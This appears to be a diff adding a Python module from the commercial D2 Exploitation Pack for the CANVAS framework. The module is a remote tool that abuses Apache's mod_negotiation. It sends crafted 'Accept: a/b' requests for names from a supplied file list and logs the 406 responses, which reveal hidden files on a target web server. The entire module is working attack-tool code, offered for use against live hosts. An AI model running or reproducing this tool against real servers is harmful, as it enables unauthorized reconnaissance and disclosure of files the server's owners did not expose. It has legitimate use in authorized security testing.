@@ -1,0 +1,126 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2011
+#
+
+import sys, time, os
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+import StringIO
+
+NAME = "d2sec_mod_negotiation"
+VERSION = "0.1"
+DESCRIPTION = "Apache HTTPD mod_negotiation file bruter Tool"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Tools"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+
+NOTES="""
+Argument flist: specify a file containing a list of files to dump
+"""
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = ""
+DOCUMENTATION["Date public"] = ""
+DOCUMENTATION["References"] = "http://appseclive.org/content/grudge-match-apaches-modnegotiation-vs-modspeling"
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["CVE Url"] = ""
+DOCUMENTATION["Notes"] = NOTES
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ''
+    self.port = 80 
+    self.fname = '' 
+    self.flist = ''
+    self.https = 0
+    self.uri = ''
+    self.name = NAME
+    self.proto = 'http'
+	
+  def mod_negotiation_discovery(self, filename):
+    content = StringIO.StringIO()
+    try:
+      import pycurl
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      self.log('[D2] Install module python-pycurl')
+      return ''
+    try:
+      c = pycurl.Curl()
+      c.setopt(pycurl.URL, '%s://%s/%s/%s' % (self.proto, self.host, self.uri, filename))
+      c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+      c.setopt(c.HTTPHEADER, ['Content-type: text/html', 'Accept: a/b'])
+      c.setopt(pycurl.WRITEFUNCTION, content.write)
+      c.perform()
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      return ''
+    if c.getinfo(pycurl.HTTP_CODE) == 406:
+      data = content.getvalue()
+      content.close()
+      return data
+    return ''
+    
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port",self.port))
+    self.fname = self.argsDict.get("fname",self.fname)
+    self.uri = self.argsDict.get("uri",self.uri)
+    self.flist = self.argsDict.get("flist",self.flist)
+    self.https = int(self.argsDict.get("https",self.https))
+
+  def run(self):
+    self.getargs()
+    if self.https == 1:
+      self.proto = 'https'
+    self.setInfo('[D2] %s attacking %s:%d' % (NAME,self.host,self.port))
+    if len(self.fname) > 0 and len(self.flist) > 0:
+      self.log('[D2] You must only specify a file or a list of files')
+      return 0
+    flist = []
+    if len(self.fname) > 0:
+      flist.append(self.fname)
+    elif len(self.flist) > 0:
+      try:
+        ftemp = open(self.flist, "r").readlines()
+      except:
+        self.log("[D2] Can't find %s" % self.flist)
+        self.setInfo('[D2] %s attacking %s:%d - failed' % (NAME,self.host,self.port))
+        return 0
+      for f in ftemp:
+        f = f.strip()
+        flist.append(f)
+    else:
+      self.log('[D2] No file or list of files specified')
+      self.setInfo('%s attacking %s:%d - failed' % (NAME,self.host,self.port))
+      return 0
+    for f in flist:
+      self.log('[#] %s' % f)
+      self.log(self.mod_negotiation_discovery(f))
+      self.log('\n')
+    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+    return 1
+
+  def usage(self):
+    print "Usage: "+sys.argv[0]+" -t target [-p port:80] -O https:[0|1] -O uri:<path> -O fname:<path> -O flist:<path>" 
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
